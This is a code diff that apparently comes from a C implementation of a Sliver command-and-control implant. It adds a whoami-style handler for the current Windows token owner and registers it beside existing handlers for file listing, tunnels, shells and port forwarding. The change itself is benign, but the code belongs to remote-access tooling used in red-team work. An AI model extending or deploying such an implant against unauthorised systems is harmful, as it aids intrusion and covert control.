@@ -375,6 +375,17 @@ static int sliver_rpc_handle_execute_async_entry(const sliver_envelope_t *req,
   return -2; /* the worker thread answers with the request envelope id */
 }
 
+/* --- Whoami (Windows CurrentTokenOwner) -------------------------------- */
+int sliver_rpc_handle_token_owner(const sliver_envelope_t *req, sliver_buf_t *out) {
+  char user[256];
+  (void)req;
+  user[0] = 0;
+  if (sliver_username(user, sizeof(user)) != 0) {
+    (void)snprintf(user, sizeof(user), "%s", "unknown");
+  }
+  return sliver_current_token_owner_encode(out, user);
+}
+
 /* --- table ------------------------------------------------------------- */
 static const rpc_entry_t g_handlers[] = {
     {SLIVER_MSG_LS_REQ, SLIVER_MSG_LS, sliver_rpc_handle_ls},
@@ -393,6 +404,8 @@ static const rpc_entry_t g_handlers[] = {
     {SLIVER_MSG_TUNNEL_CLOSE, 0, sliver_rpc_handle_tunnel_close},
     {SLIVER_MSG_SHELL_RESIZE_REQ, 0, sliver_rpc_handle_shell_resize},
     {SLIVER_MSG_PORTFWD_REQ, SLIVER_MSG_PORTFWD, sliver_rpc_handle_portfwd},
+    {SLIVER_MSG_CURRENT_TOKEN_OWNER_REQ, SLIVER_MSG_CURRENT_TOKEN_OWNER,
+     sliver_rpc_handle_token_owner},
 };
 
 void sliver_rpc_result_free(sliver_rpc_result_t *result) {
@@ -443,6 +456,7 @@ void sliver_rpc_dispatch(const sliver_envelope_t *req, sliver_rpc_result_t *resu
     return;
   }
 }
+
 
 
 
